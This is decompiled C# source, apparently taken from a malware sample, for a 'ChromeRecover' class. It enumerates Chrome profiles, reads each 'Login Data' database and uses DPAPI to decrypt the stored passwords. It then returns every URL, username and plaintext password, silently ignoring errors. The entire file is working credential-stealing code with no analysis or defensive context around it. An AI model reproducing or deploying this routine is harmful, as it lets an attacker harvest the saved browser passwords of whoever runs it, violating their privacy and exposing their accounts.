using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

// Token: 0x02000015 RID: 21
[StandardModule]
public sealed class ChromeRecover
{
	// Token: 0x060000B8 RID: 184 RVA: 0x0000E30C File Offset: 0x0000C50C
	public static string ChromePass()
	{
		try
		{
			StringBuilder stringBuilder = new StringBuilder();
			foreach (string path in Directory.GetDirectories(Interaction.Environ("localappdata") + "\\Google\\Chrome\\"))
			{
				foreach (string str in Directory.GetDirectories(path))
				{
					if (File.Exists(str + "\\Login Data"))
					{
						try
						{
							string baseName = str + "\\Login Data";
							SqLiteHandler sqLiteHandler = new SqLiteHandler(baseName);
							sqLiteHandler.ReadTable("logins");
							int rowCount = sqLiteHandler.GetRowCount();
							int num = 0;
							int num2 = rowCount - 1;
							for (int k = num; k <= num2; k++)
							{
								string value = sqLiteHandler.GetValue(k, "origin_url");
								string value2 = sqLiteHandler.GetValue(k, "username_value");
								string str2 = ChromeRecover.DecodeChrome(sqLiteHandler.GetValue(k, "password_value"));
								if (stringBuilder.Length == 0)
								{
									stringBuilder.AppendLine("Chrome:");
								}
								stringBuilder.AppendLine("URL:" + value);
								stringBuilder.AppendLine("User:" + value2);
								stringBuilder.AppendLine("Pass:" + str2 + Environment.NewLine);
							}
							if (Operators.CompareString(stringBuilder.ToString(), string.Empty, false) != 0)
							{
								stringBuilder.Append("\r\n");
							}
						}
						catch (Exception ex)
						{
						}
					}
				}
			}
			return stringBuilder.ToString();
		}
		catch (Exception ex2)
		{
		}
		return string.Empty;
	}

	// Token: 0x060000B9 RID: 185 RVA: 0x0000E4E4 File Offset: 0x0000C6E4
	private static string DecodeChrome(string data)
	{
		if (string.IsNullOrEmpty(data))
		{
			return string.Empty;
		}
		byte[] bytes = Encoding.Default.GetBytes(data);
		byte[] bytes2 = ProtectedData.Unprotect(bytes, null, DataProtectionScope.CurrentUser);
		return Encoding.UTF8.GetString(bytes2);
	}
}
